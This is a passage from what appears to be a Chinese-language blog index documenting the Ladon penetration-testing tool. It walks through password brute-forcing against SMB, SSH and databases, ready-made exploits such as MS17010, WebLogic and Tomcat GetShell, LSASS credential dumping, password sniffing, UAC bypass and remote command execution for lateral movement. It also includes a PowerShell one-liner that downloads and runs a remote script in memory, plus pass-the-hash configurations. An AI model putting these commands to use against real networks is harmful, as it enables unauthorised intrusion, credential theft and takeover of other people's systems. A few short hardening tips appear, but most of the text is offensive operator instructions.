0x002 指纹识别/服务识别(8)例子: Ladon OsScan例子: Ladon 192.168.1.8/24 OsScan ID 模块名称 功能说明 返回结果 1 OsScan 操作系统版本探测 存活IP、工作组\\机器名、操作系统、开放服务 2 PortScan 端口扫描含Banner 主机名、开放端口、服务识别、Banner、Web 3 WhatCMS 75种Web指纹识别 URL、CMS、邮件系统、登陆页面、中间件(如Apache\\Tomecat\\IIS)等 4 CiscoScan 思科设备扫描 存活IP、设备型号、主机名、Boot、硬件版本 5 EnumMssql 枚举Mssql数据库主机 数据库IP、机器名、SQL版本 6 EnumShare 枚举网络共享资源 域、存活IP、共享路径 7 LdapScan 不指定密码时，仅探测LDAP服务器 IP是否LDAP服务器 8 FtpScan 不指定密码时，仅探测FTP服务器 IP是否FTP服务器 0x003 口令检测/密码爆破(16)[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)] 例子: Ladon SshScan例子: Ladon 192.168.1.8/24 SshScan例子: Ladon 192.168.1.8:22 SshScan (指定端口)例子: Ladon test.rar RarScan ID 模块名称 功能说明 返回结果 依赖 1 SmbScan SMB密码爆破(Windows) 检测过程、成功密码、LOG文件 2 WmiScan Wmi密码爆破(Windowns) 检测过程、成功密码、LOG文件 3 IpcScan Ipc密码爆破(Windows) 检测过程、成功密码、LOG文件 4 LdapScan AD域密码爆破(Windows) 检测过程、成功密码、LOG文件 5 SmbHashScan SMB HASH密码爆破(Windows) 检测过程、成功密码、LOG文件 6 WmiHashScan WMI HASH密码爆破(Windows) 检测过程、成功密码、LOG文件 7 SshScan SSH密码爆破(Linux) 检测过程、成功密码、LOG文件 Renci.SshNet.dll 8 MssqlScan Mssql数据库密码爆破 检测过程、成功密码、LOG文件 9 OracleScan Oracle数据库密码爆破 检测过程、成功密码、LOG文件 DDTek.Oracle.dll 10 MysqlScan Mysql数据库密码爆破 检测过程、成功密码、LOG文件 MySql.Data.dll 11 WeblogicScan Weblogic后台密码爆破 检测过程、成功密码、LOG文件 12 VncScan VNC远程桌面密码爆破 检测过程、成功密码、LOG文件 VncSharp.dll 13 FtpScan Ftp服务器密码爆破 检测过程、成功密码、LOG文件 14 RarScan Rar压缩包密码爆破 检测过程、成功密码、LOG文件 Rar.exe 15 TomcatScan Tomcat后台登陆密码爆破 检测过程、成功密码、LOG文件 16 HttpBasicScan HttpBasic401认证密码爆破 检测过程、成功密码、LOG文件 0x004 漏洞检测/漏洞利用(9)例子: Ladon MS17010例子: Ladon 192.168.1.8/24 MS17010例子: Ladon http://192.168.1.8 WeblogicExp ID 模块名称 功能说明 1 MS17010 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148) 2 SMBGhost SMBGhost远程溢出漏洞检测 （CVE-2020-0796） 3 | WeblogicPoc | Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)4 | PhpStudyPoc | PhpStudy后门检测(phpstudy 2016/phpstudy 2018)5 | ActivemqPoc | ActiveMQ漏洞检测(CVE-2016-3088)6 | TomcatPoc | Tomcat漏洞检测(CVE-2017-12615)7 | WeblogicExp | Weblogic漏洞利用(CVE-2019-2725)8 | TomcatExp | Tomcat漏洞利用(CVE-2017-12615)9 | Struts2Poc | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode) 0x005 加密解密(4)例子: Ladon 字符串 EnHex例子: Ladon EnHex (批量str.txt) ID 模块名称 功能说明 1 EnHex 批量Hex密码加密 2 DeHex 批量Hex密码解密 3 EnBase64 批量Base64密码加密 4 DeBase64 批量Base64密码解密 0x006 下载功能(2)下载功能主要用于内网文件传输或者将VPS文件下载至目标机器 ID 模块名称 功能说明 用法 1 HttpDownLoad HTTP下载 Ladon HttpDownLoad http://k8gege.org/test.exe 2 FtpDownLoad Ftp下载 Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe 0x007 网络嗅探(3)基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码后续可能会添加其它功能可能另外写个专门用于嗅探的工具PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到) ID 模块名称 功能说明 用法 1 FtpSniffer/SnifferFtp Ftp密码嗅探 Ladon FtpSniffer 192.168.1.5 2 HttpSniffer/SnifferHTTP HTTP密码嗅探 Ladon HTTPSniffer 192.168.1.5 3 Sniffer 网络嗅探(源地址、目标地址) Ladon Sniffer 0x008 密码读取(2) ID 模块名称 功能说明 用法 1 EnumIIS/IisWeb IIS站点密码读取 Ladon EnumIIS 或 Ladon IisWeb 2 DumpLsass DumpLsass内存密码 Ladon DumpLsass 0x009 信息收集(3) ID 模块名称 功能说明 用法 1 EnumProcess/ProcessList/tasklist 进程详细信息 Ladon EnumProcess 或 Ladon Tasklist 2 GetCmdLine/CmdLine 获取命令行参数 Ladon cmdline 或 Ladon cmdline cmd.exe 3 GetInfo/GetInfo2 获取渗透基础信息 Ladon GetInfo 或 Ladon GetInfo2 0x010 远程执行(6) ID 模块名称 功能说明 用法 1 WmiExec 135端口执行命令 http://k8gege.org/Ladon/WinShell.html 2 PsExec 445端口执行命令 http://k8gege.org/Ladon/WinShell.html 3 AtExec 445端口执行命令 http://k8gege.org/Ladon/WinShell.html 4 SshExec 22端口执行命令 http://k8gege.org/Ladon/WinShell.html 5 JspShell Jsp一句话执行命令 http://k8gege.org/p/ladon_cs_shell.html 6 WebShell WebShell执行命令 http://k8gege.org/Ladon/webshell.html 0x011 提权降权(3) ID 模块名称 功能说明 用法 1 BypassUac 绕过UAC执行,支持Win7-Win10 Ladon BypassUac c:\\1.exe 或 Ladon BypassUac c:\\1.bat 2 GetSystem 提权或降权运行程序 Ladon GetSystem cmd.exe 或 Ladon GetSystem cmd.exe explorer 3 Runas 模拟用户执行命令 Ladon Runas user pass cmd 0x012 其它功能(6) ID 模块名称 功能说明 用法 1 EnableDotNet 一键启用.net 3.5(2008系统默认未启用) Ladon EnableDotNet 2 gethtml 获取内网站点HTML源码 Ladon gethtml http://192.168.1.1 3 CheckDoor 检测后门(网上公开多年的) Ladon CheckDoor 或 Ladon AutoRun 4 GetIP 获取本机内网IP与外网IP Ladon GetIP 5 WebSer 迷你WEB服务器 Ladon WebSer 80 或 Ladon web 80 6 NetVer 查看安装.NET版本 Ladon NetVer 或 Ladon NetVersion 6 PsVer 查看PowerShell版本 Ladon PsVer 或 Ladon PSVersion 注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。 外部插件模块(17) ID 功能 实现语言 功能说明 1 漏洞扫描 C语言 CVE 2019-0708 Windows Rdp 3389漏洞批量检测 2 漏洞利用 Exp生成器 ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit 3 漏洞利用 Python CVE-2019-9621 Zimbra GetShell Exploit 4 漏洞利用 Python CVE-2019-0604 SharePoint GetShell Exploit 5 漏洞利用 Exp生成器 CVE 2016-3088 ActiveMQ GetShell Exploit 6 漏洞利用 Python Apache Solr 8.2.0 Velocity RCE 0day Exploit 7 漏洞利用 Exp生成器 PhpStudy后门 GetShell Exploit 8 命令执行 INI配置 INI调用外部程序命令批量Linux上控 9 命令执行 INI配置 INI调用外部程序命令批量Windowns上控 10 漏洞扫描 Python PHP-FPM 远程代码执行漏洞(CVE-2019-11043) 11 漏洞扫描 Exp生成器 Weblogic CVE-2018-2894漏洞检测 12 漏洞利用 PowerShell MS17010EXP 永恒之蓝漏洞利用 13 脚本调用 PowerShell Kali 2019无PowerShell执行脚本 14 口令扫描 INI配置 ipcscan.ini INI插件之Ipc密码爆破 15 口令扫描 INI配置 smbscan.ini INI插件之Smb密码爆破 16 口令扫描 INI配置 smbhash.ini INI插件之NtlmHash爆破 17 口令扫描 INI配置 winrmscan.ini INI插件之Winrm密码爆破 文档参考Cscan: https://github.com/k8gege/K8CScan/wiki 中级用法批量扫描0x001 参数 ip/24 ip/16 ip/8命令: Ladon 192.168.1.8/24 OnlinePC 0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC 禁ping扫描默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点Ladon nopingLadon noping 192.168.1.8/24Ladon noping 192.168.1.8/24 MS17010 Socks5代理扫描详见：http://k8gege.org/Ladon/proxy.html linux/macos下KaliLadonproxychains mono Ladon noping 192.168.1.8/24 MS17010proxychains mono Ladon noping http://192.168.1.1 WhatCMS windows下Ladon.exe推荐proxifier 3.42及以上版本，最好是最新版4.0.1例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）Ladon noping 10.1.2.8/24 MS17010 配置INI调用任意程序、密码爆破适用场景，需调用相关命令或第三方工具进行批量操作或者有新的POC，但来不及或无法写成DLL来调用时很多第3方工具不支持批量或者说根本不支持批量网段而Ladon不只限于批量IP、URL、IP段、任意内容等是紧急情况下最适合用于验证内网是否存在漏洞工具新的漏洞来时你能调好POC就不错了，批量更要时间 调用系统ping命令进行存活主机探测ping.ini[Ladon]exe=cmd.exearg=/c ping $ip$ 命令: Ladon ping.ini命令: Ladon 192.168.1.8/24 ping.ini 调用Python poc批量检测漏洞[Ladon]exe=F:\\Python279\\python.exearg=CVE-2019-11043-POC.py $ip$ 例子: https://github.com/k8gege/CVE-2019-11043 自定义程序密码爆破例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。 smbhash.ini[Ladon]exe=smbexec.exearg=-hashes $pass$ $user$@$ip$isok=Launching semi-interactive shellport=445log=true INI参数说明isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破log: 程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示 检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini详见：http://localhost:4000/p/53177.html 配置端口扫描参数port.txt自定义端口使用PortScan模块时，默认扫描常见高危漏洞端口遇到修改了默认端口的，Ladon就无法扫描了吗？使用port.txt格式1:80,21,1433,3306,445格式2:80-88,21-23,5800-5900格式3:212380格式4:80-8821-23 命令行自定义端口Ladon 192.168.1.8/24 PortScan 80-89Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521 配置密码爆破参数1 支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此2 支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密3 支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认 user.txt和pass.txt分别存放用户、密码userpass.txt存放用户密码组，即每行存放用户以及密码check.txt每行存放IP\\端口\\用户\\密码 数据库口令检测数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行 mssql密码验证(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描check.txt192.168.1.8 1433 master sa k8gege192.168.1.8 sa k8gege192.168.1.8 1433 sa k8gege命令: Ladon MssqlScan oracle同理192.168.1.8 1521 orcl system k8gege192.168.1.8 orcl system k8gege192.168.1.8 system k8gege命令: Ladon OracleScan mysql无需指定数据库名192.168.1.8 3306 root k8gege192.168.1.8 root k8gege命令: Ladon MysqlScan 系统密码SSH密码爆破check.txt192.168.1.8 22 root k8gege192.168.1.8 root k8gege命令: Ladon SshScan 详细用法：http://k8gege.org/Ladon/sshscan.html SMB/WMI密码爆破check.txt192.168.1.8 admin k8gege命令: Ladon WmiScan 或 Ladon SmbScan NTLM HASH密码爆破check.txt192.168.1.8 admin k8gege命令: Ladon WmiScan 或 Ladon SmbScan 网站密码weblogic密码爆破check.txt(url 用户 密码)http://192.168.1.8:7001/console weblogic k8gege命令: Ladon WeblogicScan 文件密码RAR文件密码爆破因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码命令: Ladon test.rar RarScan PowerShellPowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。 0x001 PowerShell本地加载适用于支持PowerShell交互远控或Shell，如Cobalt Strike 123&gt; powershell &gt; Import-Module .\\Ladon.ps1&gt; Ladon OnlinePC 0x002 Cmd本地加载适用于还没跟上时代的远控或Shell只支持CMD交互 1&gt; powershell Import-Module .\\Ladon.ps1;Ladon OnlinePC 0x003 Cmd远程加载适用于还没跟上时代的远控或Shell只支持CMD交互 1&gt; powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC\" 0x004 远控交互式CMD 0x005 菜刀非交互CMD 0x006 Empire非交互CMDEmpire的shell有点问题，分号被截断，可以加个cmd /c 0x007 MSF交互式CMD高级用法Ladon最初的设计就是一款扫描框架，为了方便才内置功能毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的不像MSF框架和模块多大都无所谓，因为你只是在本地使用为了让大家都可以自定义模块，Ladon插件支持多种编程语言最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本 0x001 Exp生成器EXP生成器教程: https://github.com/k8gege/Ladon/wiki/LadonExp-Usage实战例子: https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894 0x002 自定义模块教程自定义模块教程: https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 0x003 插件例子源码https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar Ladon下载最新版本：https://k8gege.org/Download","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"}]},{"title":"Ladon枚举远程主机网卡信息(OXID定位多网卡主机)","slug":"OXID_Scan_NetIP","date":"2020-07-17T12:45:00.000Z","updated":"2020-07-18T04:03:12.672Z","comments":true,"path":"p/ethscan.html","link":"","permalink":"http://k8gege.org/p/ethscan.html","excerpt":"","text":"=============================================================================================+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/ethscan.html\"; 前言OXID Resolver是在支持COM +的每台计算机上运行的服务。它执行两项重要职责：存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。 我们只需要向远程主机发以下两个包，再解析返回结果即可。 1234567891011121314151617181920 static byte[] s1 =&#123;0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xb8,0x10,0xb8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a,0x00,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00 &#125;; static byte[] s2 =&#123;0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00 &#125;; 程序版本Ladon &gt;=7.0 模块名称EthScanOxidScan 模块说明通过Windows的一些DCOM接口进行网卡进行信息枚举，定位多网卡主机，在无权限的情况下得知远程主机是否含有内网甚至VPN;当然也可以判定Windows主机,K8抓包发现xp和03系统有一段相同特征，WIN7-WIN10等也是相同特征，所以可区分是否WIN7以上系统。 前提条件1.Windows主机2.开放135端口3.DCOM&gt;=5.6（老外原文说5.6版本才可用，可能他写错了）4.dcomcnfg配置中的“面向连接的TCP/IP”协议没有被移除 PS: 由于有一定条件限制，若该模块无法定位多网卡主机，也可使用OnlinePC、OsScan、WebScan、WhatCMS等模块探测，如多个IP同一个机器名，网样的网站标题，或同样的网卡MAC地址，也可定位多网卡主机，只是没有通过该方法好，毕竟一个是100%，一个是90%，比如负载均横同样的网站却不在同一台机器上。 测试系统测试XP/Win7/Win8/Win10,2003/2008/2012均成功，2016和2019无环境未测，应该支持。 EthScan模块用法扫描指定主机Ladon 192.168.1.8 EthScan 扫描C段主机Ladon 192.168.1.8/24 EthScanLadon 192.168.1.8/C EthScan 批量扫描IP列表主机ip.txt里放需要扫描的IP，使用以下命令即可Ladon EthScan 批量检测IP段（/24）ip24.txt里放需要扫描的IP段，使用以下命令即可Ladon EthScan 批量检测IP段（/16）ip16.txt里放需要扫描的IP段，使用以下命令即可Ladon EthScan 关闭135端口防止通过135网卡探测运行dcomcnfg，打开“组件服务”→“计算机”，在“我的电脑”上右键点击，选“属性”；然后点默认属性，把“在此计算机上启用分布式COM（E）”的勾去掉，接着返回到“默认协议”，移除“面向连接的TCP/IP”协议。重启后发现135端口还是开放，但已无法探测机器名和网卡，不过WmiScan还可以扫描到密码。 彻底关闭135端口运行regedit，进入注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc右键点击Rpc,新建——项——输入 Internet然后重启，再cmd,输入netstat -an,就发现135端口彻底消失，此时无法枚举网卡信息，也无法WMI扫描密码，无法WMI远程执行等。 PS：由于很多服务是互相依赖的关系，不推荐关闭以免影响系统服务，比如计划任务程序无法正常运行，磁盘碎片整理又依赖计划任务而打不开等。 参考https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/ https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"}],"tags":[{"name":"OXID","slug":"OXID","permalink":"http://k8gege.org/tags/OXID/"}]},{"title":"Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796","slug":"SMBGhost_cve_2020_0796","date":"2020-06-03T14:40:00.000Z","updated":"2020-07-04T16:42:22.361Z","comments":true,"path":"p/smbghost_cve_2020_0796.html","link":"","permalink":"http://k8gege.org/p/smbghost_cve_2020_0796.html","excerpt":"","text":"漏洞介绍2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。 影响版本CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。 模块说明漏洞编号：CVE-2020-0796漏洞别名：SMBGhost、永恒之黑影响版本：Win10或2016 1903 | 1909返回结果：IP、机器名、漏洞编号、操作系统版本 无损扫描通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。 SMBGhost漏洞检测扫描指定主机SMBGhost漏洞Ladon 192.168.1.8 SMBGhost 扫描C段主机SMBGhost漏洞Ladon 192.168.1.8/24 SMBGhostLadon 192.168.1.8/C SMBGhost 批量扫描IP列表主机SMBGhost漏洞ip.txt里放需要扫描的IP，使用以下命令即可Ladon SMBGhost 批量检测IP段（/24）SMBGhost漏洞ip24.txt里放需要扫描的IP段，使用以下命令即可Ladon SMBGhost 批量检测IP段（/16）SMBGhost漏洞ip16.txt里放需要扫描的IP段，使用以下命令即可Ladon SMBGhost POC/EXP/LPEhttps://github.com/danigargu/CVE-2020-0796https://github.com/chompie1337/SMBGhost_RCE_PoC 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"}],"tags":[{"name":"LPE","slug":"LPE","permalink":"http://k8gege.org/tags/LPE/"},{"name":"RCE","slug":"RCE","permalink":"http://k8gege.org/tags/RCE/"},{"name":"CVE-2020-0796","slug":"CVE-2020-0796","permalink":"http://k8gege.org/tags/CVE-2020-0796/"},{"name":"SMBGhost","slug":"SMBGhost","permalink":"http://k8gege.org/tags/SMBGhost/"}]},{"title":"〖教程〗Ladon连接WebShell一句话远程执行命令","slug":"WebShell","date":"2020-05-31T14:20:00.000Z","updated":"2020-06-06T02:23:48.793Z","comments":true,"path":"p/webshell.html","link":"","permalink":"http://k8gege.org/p/webshell.html","excerpt":"","text":"在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/webshell.html\"; http://k8gege.org/Ladon/webshell.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"}],"tags":[{"name":"WebShell","slug":"WebShell","permalink":"http://k8gege.org/tags/WebShell/"},{"name":"RCE","slug":"RCE","permalink":"http://k8gege.org/tags/RCE/"},{"name":"ladon","slug":"ladon","permalink":"http://k8gege.org/tags/ladon/"}]},{"title":"Ladon简明教程","slug":"Ladon Example","date":"2020-05-31T06:20:00.000Z","updated":"2020-05-31T14:29:48.785Z","comments":true,"path":"p/webshell.html","link":"","permalink":"http://k8gege.org/p/webshell.html","excerpt":"","text":"本文仅是Ladon简单使用例子，Cobalt Strike或PowerShell版用法一致。 完整文档：http://k8gege.org =============================================================================================+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/example.html\";","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"}]},{"title":"〖教程〗Ladon迷你WEB服务器/一键内网HTTP服务器","slug":"Ladon WebSer","date":"2020-05-30T06:10:00.000Z","updated":"2020-05-30T06:48:17.798Z","comments":true,"path":"p/webser.html","link":"","permalink":"http://k8gege.org/p/webser.html","excerpt":"","text":"前言你是否在为配置浏览器漏洞测试环境而烦恼，如配置Apache解析某种MIME测试某个漏洞又或者在为内网机器无WEB又无法通过其它协议传输文件到内网另一台不出网的主机烦恼还有些远程命令不支持多条语句，需要多次写入或HTTP一次性下载过去，显然都会选后者 应用场景1.浏览器0day漏洞测试或VPS上一键部署，无需安装配置Apache2.内网HTTP协议文件传输，如内网目标不出网不允许其它协议通过3.Office/Word/Pdf等漏洞或远程下载SCT、HTA等格式的CS Payload4.IP追踪，在邮件里放任意URL，当目标查阅邮件时，可记录访问IP5.系统探测，无论用于XSS或IP追踪都会记录UA，确认目标操作系统 PS：不是非要使用Apache/Ngnix才能复现以上相关漏洞，配置麻烦 =============================================================================================+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/webser.html\"; http://k8gege.org/Ladon/webser.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"webser","slug":"webser","permalink":"http://k8gege.org/tags/webser/"}]},{"title":"〖教程〗Ladon以指定用户权限运行程序或命令","slug":"Ladon runas","date":"2020-05-24T14:10:00.000Z","updated":"2020-05-24T17:58:59.904Z","comments":true,"path":"p/runas.html","link":"","permalink":"http://k8gege.org/p/runas.html","excerpt":"","text":"Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/runas.html\"; http://k8gege.org/Ladon/runas.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"runas","slug":"runas","permalink":"http://k8gege.org/tags/runas/"}]},{"title":"Ladon远程命令执行Wmiexec/psexec/atexec/sshexec/webshell","slug":"WinShell","date":"2020-05-21T15:20:00.000Z","updated":"2020-06-06T02:24:47.399Z","comments":true,"path":"p/winshell.html","link":"","permalink":"http://k8gege.org/p/winshell.html","excerpt":"","text":"在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/WinShell.html\"; http://k8gege.org/Ladon/WinShell.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Rce","slug":"Rce","permalink":"http://k8gege.org/tags/Rce/"}]},{"title":"Winrm远程命令/端口复用后门/WinrmCmd/密码爆破","slug":"WinrmScan","date":"2020-05-18T14:10:00.000Z","updated":"2020-06-06T02:25:08.742Z","comments":true,"path":"p/winrmscan.html","link":"","permalink":"http://k8gege.org/p/winrmscan.html","excerpt":"","text":"WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/WinrmScan.html\"; http://k8gege.org/Ladon/WinrmScan.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"},{"name":"密码爆破","slug":"Brute-Force","permalink":"http://k8gege.org/categories/Brute-Force/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Rce","slug":"Rce","permalink":"http://k8gege.org/tags/Rce/"},{"name":"brute 